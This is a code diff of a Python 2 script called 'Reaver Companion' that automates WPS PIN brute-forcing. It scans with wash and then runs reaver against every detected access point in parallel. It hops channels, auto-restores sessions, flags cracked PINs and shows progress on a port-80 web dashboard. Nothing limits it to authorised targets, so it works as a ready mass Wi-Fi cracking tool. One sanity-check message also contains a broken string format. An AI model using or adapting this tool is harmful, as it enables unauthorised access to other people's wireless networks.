@@ -1,4 +1,4 @@
-#/usr/local/bin/python
+#! /usr/bin/python
 import subprocess
 import os
 from select import select
@@ -6,26 +6,34 @@ import sys
 import fcntl, os
 import time
 import re
-
 import string,cgi,time
 from os import curdir, sep
 from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
 import threading
+from optparse import OptionParser
 
-INTERFACE  = "mon0"
-REAVER_CMD = "./reaver_tag -i %s -b %%s -c %%d -vv" % (INTERFACE)
-WASH_CMD   = "./wash -i %s" % (INTERFACE)
+VERSION = "0.1"
+VERSION_STR = 'Reaver Companion v%s\nCopyright 2012, Ruby Feinstein <shoote@gmail.com>' % VERSION
 
-WASH_TIMEOUT = 60
+REAVER_TAG = "./reaver_tag"
+REAVER_CMD = "%s -i %%s -b %%s -c %%d -vv" % REAVER_TAG
+WASH_CMD   = "./wash -i %s"
+
+WASH_TIMEOUT = 30
+SIMULATE_WASH = True
 
 LOG_DIR = "reaver-script-logs"
 
+DEBUG = 3
 VERBOSE = 2
 INFO = 1
 ERROR = 0
 
-LEVEL = 100
-DISABLED = LEVEL + 1
+PRINT_LEVEL = INFO
+LOG_LEVEL = 100
+
+DISABLED = LOG_LEVEL + 1
+
 SIGCONT = 18
 
 PAUSE_STRING = "Reaver-script: Sleep"
@@ -39,16 +47,71 @@ MAX_TIME_PER_ITER = 300
 DEAD = 0
 SUSPENDED = 1
 RUNNING = 2
+CRACKED = 3
 PRE_RUN = -1
 
-def debug(level, *args):
-    if level<=LEVEL:
-        buffer = "".join([str(i) for i in args])
-        print buffer
- 
+# reaver script states
+STATE_RUNNING_WASH = 0
+STATE_RUNNING_REAVER = 1
+TIMESTAMP_FORMAT = "%d.%m.%y %H:%M:%S"
+
+START_TIME_STR = time.strftime(TIMESTAMP_FORMAT)
+
+HTTP_SERVER_LOG = "http_server.log"
+
+class DebugClass(object):
+    def __init__(self, log_filename = "reaver-script.log"):
+        self.log_filename = log_filename
+        self.log_run_dir = os.path.join(LOG_DIR, START_TIME_STR)    
+        self.log_dir_init = False
+        self.log_level = LOG_LEVEL  
+        self.print_level = PRINT_LEVEL
+    
+    def get_log_file(self):
+        filename = self.log_filename
+        file_path = os.path.join(self.log_run_dir, filename)
+        return file_path            
+    
+    def prepare_log_dir(self):
+        if not(os.path.exists(self.log_run_dir)):
+            os.makedirs(self.log_run_dir)    
+    
+    def debug(self, level, *args, **kargs):
+        if not(self.log_dir_init):
+            self.prepare_log_dir()
+        
+        buffer = "".join([str(i) for i in args])       
+        
+        dont_timestamp = False
+        if "dont_timestamp" in kargs:
+            dont_timestamp = kargs["dont_timestamp"]
+        if dont_timestamp == False:
+            buffer = "[%s] %s" % (time.strftime(TIMESTAMP_FORMAT),buffer)
+
+        add_line = True
+        if "add_line" in kargs:
+            add_line = kargs["add_line"]
+        if add_line:
+            buffer = buffer + "\n"
+       
+        
+        if level<=self.log_level:
+            log_file = file(self.get_log_file(),'a')
+            log_file.write(buffer)
+            log_file.close()
+        
+        if level<=self.print_level:
+            print buffer,
+
 def generate_handler(parent):
     main_template = file(r'main.html','r').read()
-    class TinyHandler(BaseHTTPRequestHandler):
+    class TinyHandler(DebugClass, BaseHTTPRequestHandler):
+        def __init__(self, request, client_address, server):
+            DebugClass.__init__(self, log_filename=HTTP_SERVER_LOG)
+            BaseHTTPRequestHandler.__init__(self, request, client_address, server)
+    
+        def log_message(self, format, *args):
+            pass    
     
         def _gen_networks_table(self):
             networks = parent.get_all_networks()
@@ -77,19 +140,59 @@ def generate_handler(parent):
                 
             return result
             
+        def get_version_html(self):
+            buffer = ""
+            for line in VERSION_STR.splitlines():
+                buffer += "<h2>%s</h2>" % line.replace("<", "&lt;").replace(">","&gt;")
+            return buffer
+            
         def handle_main(self):
-            debug(VERBOSE, "handle_main")
+            self.debug(VERBOSE, "handle_main")
             self.send_response(200)
             self.send_header('Content-type',	'text/html')
             self.end_headers()
             response = main_template
-            response = response.replace("[start_time]", time.strftime("%H:%M:%S", time.localtime(parent.start_time)))
+            response = response.replace("[version_str]", self.get_version_html())
+            response = response.replace("[start_time]", time.strftime(TIMESTAMP_FORMAT, time.localtime(parent.start_time)))
             response = response.replace("[total_number_of_pins]", str(parent.total_number_of_pins) )
             response = response.replace("[seconds_per_pin]", "%0.1f" % parent.get_seconds_per_pin() ) 
             response = response.replace("[networks]", self._gen_networks_table() )
             self.wfile.write(response)
             return
             
+        def handle_get_log(self, bssid):
+            self.debug(VERBOSE, "serving logs for %s" % bssid)
+            f = self.find_log_for_bssid(bssid)
+            self.send_response(200)
+            self.send_header('Content-type','text')
+            self.end_headers()
+            self.wfile.write(f.read())
+            f.close()        
+        
+        
+        def handle_kill(self, bssid):
+            n = self.find_network_for_bssid(bssid)
+            if n.status in [RUNNING, SUSPENDED]:
+                parent.debug(INFO, "killing process %d (http server command)" % n.p.pid)
+                n.p.terminate()
+            self.send_response(200)
+            self.send_header('Content-type','text/html')
+            f = file('redirect.html','r')
+            self.end_headers()
+            self.wfile.write(f.read())
+            f.close()            
+        
+        def handle_wash(self):
+            self.send_response(200)
+            self.send_header('Content-type','text/html')
+            f = file('running_wash.html','r')
+            buffer = f.read()
+            f.close()
+            wash_html = parent.wash_data.replace("\n","<br>").replace(" ","&nbsp")
+            buffer = buffer.replace("[wash_log]", wash_html)
+            self.end_headers()
+            self.wfile.write(buffer)
+                     
         
         def find_network_for_bssid(self, bssid):
             networks = parent.get_all_networks()
@@ -100,40 +203,30 @@ def generate_handler(parent):
             
         def find_log_for_bssid(self,bssid):
             n = self.find_network_for_bssid(bssid)
-            return file(n.get_log_path(),'r')
+            return file(n.get_log_file(),'r')
         
         def do_GET(self):
             try:
-                debug(VERBOSE, "http path: %s" % self.path) 
-                if self.path in ["/"]:
-                    self.handle_main()
+                self.debug(VERBOSE, "http path: %s" % self.path) 
+                
+                if parent.state == STATE_RUNNING_WASH:
+                    self.handle_wash()
                     return
                 
-                
-                if self.path.find("/log/")!=-1:
-                    bssid = self.path.split("/")[-1]
-                    f = self.find_log_for_bssid(bssid)
-                    self.send_response(200)
-                    self.send_header('Content-type','text')
-                    self.end_headers()
-                    self.wfile.write(f.read())
-                    f.close()
-                    return
-                
-                
-                if self.path.find("/kill/")!=-1:
-                    bssid = self.path.split("/")[-1]
-                    n = self.find_network_for_bssid(bssid)
-                    if n.status in [RUNNING, SUSPENDED]:
-                        debug(INFO, "killing process %d" % n.p.pid)
-                        n.p.terminate()
-                    self.send_response(200)
-                    self.send_header('Content-type','text/html')
-                    f = file('redirect.html','r')
-                    self.end_headers()
-                    self.wfile.write(f.read())
-                    f.close()
-                    return                                   
+                if parent.state == STATE_RUNNING_REAVER:
+                    if self.path in ["/"]:
+                        self.handle_main()
+                        return
+                    
+                    if self.path.find("/log/")!=-1:
+                        bssid = self.path.split("/")[-1]
+                        self.handle_get_log(bssid)
+                        return
+                    
+                    if self.path.find("/kill/")!=-1:
+                        bssid = self.path.split("/")[-1]
+                        self.handle_kill(bssid)
+                        return                                   
                 
                 self.send_error(404,'Invalid request: %s' % self.path)
                     
@@ -141,30 +234,33 @@ def generate_handler(parent):
                 self.send_error(404,'File Not Found: %s' % self.path)
     
     return TinyHandler
-class TinyHttpServer(threading.Thread):
+class TinyHttpServer(DebugClass, threading.Thread):
     def __init__(self, parent):
         self.parent = parent
         threading.Thread.__init__(self)
-    
+        DebugClass.__init__(self, log_filename=HTTP_SERVER_LOG)
+        self.server = None
     def shutdown(self):
-        self.server.shutdown()
+        if self.server:
+            self.server.shutdown()
     
     def run(self):
         try:
             self.server = HTTPServer(('', 80), generate_handler(self.parent) )
-            debug(INFO,'started httpserver...')
+            self.debug(INFO,'started httpserver...')
             self.server.serve_forever()
         except KeyboardInterrupt:
-            debug(ERROR, '^C received, shutting down server')
+            self.parent.debug(ERROR, '^C received, shutting down server')
             self.server.socket.close()
 
-class Watchdog(threading.Thread):
+class Watchdog(DebugClass, threading.Thread):
     def __init__(self, parent):
-        debug(VERBOSE, "Watchdog init")
         self.parent = parent
         threading.Thread.__init__(self)
         self.should_stop = False
-    
+        DebugClass.__init__(self)
+        self.debug(DEBUG, "Watchdog init")        
+ 
     def shutdown(self):
         self.should_stop = True
     
@@ -172,23 +268,77 @@ class Watchdog(threading.Thread):
         while not(self.should_stop):
             for n in self.parent.get_all_running_networks():
                 if n.get_last_iter_duration() > MAX_TIME_PER_ITER:
-                    n.write_to_log("REAVER_SCRIPT: iter_timeout")
+                    n.debug(ERROR, "REAVER_SCRIPT: iter_timeout, killing %s" % n)
                     n.p.terminate()
             time.sleep(1)
             
-class ReaverScript(object):
-    def __init__(self):
-        self.start_time_str = time.asctime()
+class ReaverScript(DebugClass):
+    def __init__(self, interface="mon0"):
+        DebugClass.__init__(self)
+        self.print_level = INFO
+        self.debug(INFO, VERSION_STR + "\n", dont_timestamp = True)
         self.total_number_of_pins = 0
-        self.log_run_dir = os.path.join(LOG_DIR, self.start_time_str)
         self.groups = []
-        self.prepare_log_dir()
+        self.interface = interface    
+        self.state = None
+        self.wash_data = ""
+        self.last_super_suspend = 0
+        self.last_super_suspend_timeout = 1
+        self.server = None
+        self.watchdog = None
+        self.sanity()
     
+    def sanity(self):
+        self.check_mon_interface()   
+        wash = WashWrapper(self)
+        wash.sanity()
+        self.check_reaver_tag()
+    
+    
+    def get_state_str(self):
+        if self.state == None:
+            return "NONE"
+        elif self.state == STATE_RUNNING_WASH:
+            return "running wash"
+        elif self.state == STATE_RUNNING_REAVER:
+            return "running reaver"
+    
+    def check_reaver_tag(self):
+        try:
+            command = "%s --help" % REAVER_TAG
+            retcode = subprocess.call(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)   
+            if retcode != 1:
+                raise subprocess.CalledProcessError(retcode, command)
+        except subprocess.CalledProcessError, e:
+            message = "SANITY CHECK ERROR: failed running reaver_tag" % self.interface
+            self.debug(ERROR, message)
+            raise e 
+    
+    def check_mon_interface(self):
+        try:
+            subprocess.check_call("iwconfig %s" % self.interface, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)  
+        except subprocess.CalledProcessError, e:
+            message = "SANITY CHECK ERROR: you should first use airmon-ng to create %s interface" % self.interface
+            self.debug(ERROR, message)
+            raise e      
+        
+    def switch_channel(self, n):
+        self.debug(VERBOSE, "switching to channel %d." % n)
+        subprocess.check_call("iwconfig %s channel %d" % (self.interface, n), shell=True)        
+        
     def get_all_networks(self):
         networks = []
         for g in self.groups:
             networks += g.networks
         return networks    
+    
+    def count_living_networks(self):
+        networks = self.get_all_networks()
+        count = 0
+        for n in networks:
+            if n.status in [RUNNING, SUSPENDED, PRE_RUN]:
+                count += 1
+        return count
     
     def get_all_running_networks(self):
         networks = self.get_all_networks()
@@ -200,43 +350,66 @@ class ReaverScript(object):
             
         total_time = time.time() - self.start_time
         return total_time/float(self.total_number_of_pins)
-    
+        
     def run(self):
         try:
             self.start_time = time.time()
-            #buffer = file(r'wash_test.txt','rb').read() 
-            buffer = self.wash()
+            self.server = TinyHttpServer(self)
+            self.server.start()            
+            
+            buffer = ""
+            if SIMULATE_WASH:
+                buffer = file(r'wash_test.txt','rb').read() 
+            else:
+                wash = WashWrapper(self)
+                buffer = wash.run()
             
             self.groups = self.parse_wash(buffer)
             
-            self.server = TinyHttpServer(self)
-            self.server.start()
-            
             self.watchdog = Watchdog(self)
             self.watchdog.start()            
-                
+            
+            self.state = STATE_RUNNING_REAVER
+            
             for i in self.groups:
-                debug(VERBOSE, repr(i))
-            while True:
+                self.debug(VERBOSE, repr(i))
+            while self.count_living_networks() != 0:
+                count = 0
+                total_time = time.time() - self.start_time
+
+                if self.total_number_of_pins !=0:
+                    self.debug(INFO, "STATS: tested %d pins, %0.1f sec/pin" % 
+                         (self.total_number_of_pins, self.get_seconds_per_pin() ) )                
+                
                 for g in self.groups:
-                    total_time = time.time() - self.start_time
-                    if self.total_number_of_pins !=0:
-                        debug(INFO, "STATS: tested %d pins, %0.1f sec/pin" % 
-                             (self.total_number_of_pins, self.get_seconds_per_pin() ) )
                     if g.count()==0:
                         continue
-                    g.run_loop()
-                    debug(VERBOSE, repr(g))        
+                    count += g.run_loop()
+                    self.debug(VERBOSE, repr(g))  
+                if count == 0:
+                    timeout = self.get_smart_suspend_time()
+                    self.debug(INFO, "all the networks are suspended, sleeping for %d seconds" % timeout)
+                    time.sleep(timeout)
                     
+            self.debug(INFO, "we finished here (count_living_networks == 0)")
+            
         except KeyboardInterrupt:
-            debug(ERROR, '^C received, shutting down.')
-            self.server.shutdown()
-            self.watchdog.shutdown()
-        
-        
-    def prepare_log_dir(self):
-        os.makedirs(self.log_run_dir)
+            self.debug(ERROR, '^C received, shutting down.')
+        finally:
+            if self.server:
+                self.server.shutdown()
+            if self.watchdog:
+                self.watchdog.shutdown()
 
+    def get_smart_suspend_time(self):
+        last = self.last_super_suspend
+        if time.time() - last > self.last_super_suspend_timeout:
+            return 1
+        else:
+            self.last_super_suspend_timeout *= 2
+            self.last_super_suspend = time.time()
+            return self.last_super_suspend_timeout
+            
     def parse_wash(self,buffer):
         lines = buffer.splitlines()
         first_line = -1
@@ -248,30 +421,50 @@ class ReaverScript(object):
         networks = [Network(i, self) for i in lines[first_line:]]
         groups = [Group(i, self) for i in xrange(CHAN_MIN,CHAN_MAX+1)]
         for n in networks:
-            debug(VERBOSE,"adding %s to group %d" % (n, n.channel-1))
+            self.debug(VERBOSE,"adding %s to group %d" % (n, n.channel-1))
             groups[n.channel-1].add(n)
         return groups
         
-    def wash(self):
-        debug(INFO,"Running 'wash' for %d seconds" % WASH_TIMEOUT)
+class WashWrapper(DebugClass):
+    def __init__(self, parent):
+        self.parent = parent
+        DebugClass.__init__(self, log_filename = "wash.log")
+    
+    def sanity(self):
+        try:
+            command = WASH_CMD % self.parent.interface
+            command += " --help"
+            retcode = subprocess.call(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
+            if retcode != 1:
+                raise subprocess.CalledProcessError(retcode, command)
+        except subprocess.CalledProcessError, e:
+            message = "SANITY CHECK ERROR: failed running wash"
+            self.debug(ERROR, message)
+            raise e        
+    
+    def run(self):
+        self.parent.state = STATE_RUNNING_WASH
+        self.parent.debug(INFO,"Running 'wash' for %d seconds" % WASH_TIMEOUT)
         start_time = time.time()
-        p = my_popen(WASH_CMD)
+        p = my_popen(WASH_CMD % (self.parent.interface) )
         data = ""
         while (time.time() - start_time < WASH_TIMEOUT) and p.poll()==None:
             r_list, w_list, x_list = select([p.stdout, p.stderr], [], [], 0.5)
             for i in r_list:
                 buffer = i.read()
-                data += buffer
                 if len(buffer)>0:
-                    print buffer,
-        
+                    self.debug(INFO, buffer, add_line = False)
+                data += buffer
+                self.parent.wash_data = data
         if p.poll()!=None:
+            self.parent.debug(ERROR, "wash finished ahead of time")
             raise Exception("wash finished ahead of time")
         p.terminate()
         #todo check return codeash 
-        return data        
+        self.parent.debug(INFO,"Wash ended nicely")
+        return data           
         
-class Group(object):
+class Group(DebugClass):
     def __init__(self, channel, parent, networks=None):
         self.parent = parent
         if networks==None:
@@ -282,6 +475,7 @@ class Group(object):
         self.iter_count = 0
         self.avg_iter_time = 0
         self.total_run_time = 0
+        DebugClass.__init__(self)
         
     def add(self,n):
         self.networks.append(n)
@@ -306,9 +500,11 @@ class Group(object):
         return buffer
     
     def run_loop(self):
-        switch_channel(self.channel)
-        self.run()
-        self.select_loop()
+        self.parent.switch_channel(self.channel)
+        count = self.run()
+        if count >= 0:
+            self.select_loop()
+        return count
     
     def select_loop(self):
         self.last_iter_time = 0
@@ -338,15 +534,15 @@ class Group(object):
                     r_wait_list.append(n.p.stderr)        
             r_ready, w_ready, x_ready = select(r_wait_list, [], [], 0.5)
             if len(r_ready)==0:
-                debug(DISABLED,"select_loop: len(r_ready)==0") 
+                self.debug(DISABLED,"select_loop: len(r_ready)==0") 
             for f in r_ready:
                 buffer = f.read()
                 n = reverse_dict[f]
                 for line in buffer.splitlines():
-                    n.write_to_log(line)
+                    n.debug(VERBOSE, line)
                     # Check for PAUSE_STRING
                     if line.find(PAUSE_STRING)!=-1:
-                        debug(VERBOSE, "detected pause on %s" % n)
+                        self.debug(VERBOSE, "detected pause on %s" % n)
                         r_wait_list.remove(n.p.stdout)
                         r_wait_list.remove(n.p.stderr)
                         n.status = SUSPENDED
@@ -362,36 +558,41 @@ class Group(object):
                             n.pin_count += 1
                             self.parent.total_number_of_pins += 1
                     if line.find("Restore previous session for")!=-1:
-                        debug(INFO,"auto restore previous session for %s" % n)
+                        self.debug(INFO,"auto restore previous session for %s" % n)
                         n.p.stdin.write("Y\n")
                         n.p.stdin.flush()
+                    if line.find("Pin cracked in")!=-1:
+                        self.debug(INFO, "cracked pin for %s" % n)
+                        n.status = CRACKED
                         
         self.last_iter_time = time.time() - start_time     
         self.total_run_time += self.last_iter_time
         self.avg_iter_time = self.total_run_time / self.iter_count
         
-        debug(VERBOSE, "channel %d suspended" % self.channel)
+        self.debug(VERBOSE, "channel %d suspended" % self.channel)
         
-    
     def run(self):
+        count = 0
         for n in self.networks:
             if time.time() - n.suspend_time < n.min_sleep_time:
-                debug(VERBOSE, "time.time() - n.suspend_time < n.min_sleep_time")
+                self.debug(VERBOSE, "time.time() - n.suspend_time < n.min_sleep_time")
                 continue
-            if n.p == None:
-                debug(INFO, "Starting reaver on network %s" % n)
+            if n.status == PRE_RUN:
+                self.debug(INFO, "Starting reaver on network %s" % n)
                 n.p = my_popen(n.get_command())
                 n.set_status_running()
+                count += 1
             elif n.p.poll()==None:
                 n.p.send_signal(SIGCONT)
                 n.set_status_running()
-            else:
+                count += 1 
+            elif n.status != CRACKED:
                 n.status = DEAD
-
-class Network(object):
+        return count
+class Network(DebugClass):
     def __init__(self,line, parent):
         self.parent = parent
-        debug(VERBOSE, "wash: %s" % line)
+        
         m = re.search(r'((?:(?:[A-F0-9]{2}):){5}[A-F0-9]{2}).+?([0-9]).+?(-*[0-9]+).+?([0-9]\.[0-9]).+?((?:Yes)|(?:No)).+?(\w+)', line)
         self.bssid, self.channel, self.rssi, self.version, self.locked, self.essid =  m.groups()
         self.channel = int(self.channel)
@@ -412,6 +613,10 @@ class Network(object):
         self.version = float(self.version)
         self.pin_count = 0
         self.p = None
+        
+        DebugClass.__init__(self)   
+        self.log_filename = "%d - %s - %s" % (self.channel, self.bssid, self.essid)
+        
     
     def set_status_running(self):
         self.status = RUNNING
@@ -432,33 +637,20 @@ class Network(object):
         elif self.status == SUSPENDED:
             return "suspended"
         elif self.status == PRE_RUN:
-            return "pre_run"    
+            return "pre_run"  
+        elif self.status == CRACKED:
+            return "cracked"
     
     def __str__(self):
         return "%s(%d)" % (self.essid, self.channel)
 
     def get_command(self):
-        return REAVER_CMD % (self.bssid, self.channel)
+        return REAVER_CMD % (self.parent.interface, self.bssid, self.channel)
         
     def __del__(self):
         if self.p != None and self.p.poll() == None:
-            debug(VERBOSE, "cleaning %s" % self)
+            self.debug(VERBOSE, "cleaning %s" % self)
             self.p.kill()
-    
-    def write_to_log(self, line):
-        debug(VERBOSE, "%s: %s" % (self, line) )    
-        f = self.get_log_file()
-        f.write(line + "\n")
-        f.close()
-    
-    def get_log_path(self):
-        filename = "%d - %s - %s" % (self.channel, self.bssid, self.essid)
-        file_path = os.path.join(self.parent.log_run_dir, filename)
-        return file_path
-    
-    def get_log_file(self):
-        file_path = self.get_log_path()
-        return file(file_path,'a')
    
 def my_popen(command):
     p = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE, bufsize=1)
@@ -466,10 +658,27 @@ def my_popen(command):
     fcntl.fcntl(p.stderr.fileno(), fcntl.F_SETFL, os.O_NONBLOCK)
     return p
 
-def switch_channel(n):
-    debug(VERBOSE, "switching to channel %d." % n)
-    subprocess.check_call("iwconfig %s channel %d" % (INTERFACE, n), shell=True)
+def main():
 
+    global PRINT_LEVEL
+    global MAX_TIME_PER_ITER
+    
+    parser = OptionParser(usage=VERSION_STR)
+    parser.add_option("-i", "--interface", dest="interface",
+                      help="interface to capture packets on", default="mon0", action="store")
+    parser.add_option("-v", "--stdout_verbose", dest="verbose",
+                      help="sets the verbosity level printed to stdout", default=PRINT_LEVEL, action="store")
+    parser.add_option("-t", "--iter_timeout", dest="iter_timeout",
+                      help="sets the max iteration time (per reaver instance)", default=MAX_TIME_PER_ITER, action="store")
+                          
+    (options, args) = parser.parse_args()
+    
 
-r = ReaverScript()
-r.run()
+    PRINT_LEVEL = int(options.verbose)
+    MAX_TIME_PER_ITER = int(options.iter_timeout)
+    interface = options.interface
+    r = ReaverScript(interface = interface)
+    r.run()
+    
+if __name__ == '__main__':
+    main()
